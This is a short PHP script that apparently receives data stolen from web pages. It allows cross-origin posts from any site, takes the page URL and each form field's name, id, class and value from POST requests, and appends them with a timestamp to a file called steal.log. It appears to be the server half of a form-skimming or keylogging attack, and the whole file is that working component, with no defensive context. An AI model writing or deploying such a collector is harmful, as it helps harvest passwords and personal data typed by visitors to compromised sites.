<?php

header("Access-Control-Allow-Origin: *");

$time = date("d.m.Y H:i:s". time());
$url = $_POST['url'];
$type = $_POST['type'];
$name = $_POST['name'];
$id = $_POST['id'];
$class = $_POST['class'];
$value = $_POST['value'];

$result = "[$time] $type: $url | $name $id $class | $value";

$log = file_get_contents("./steal.log");

file_put_contents("./steal.log", "$log\r\n$result");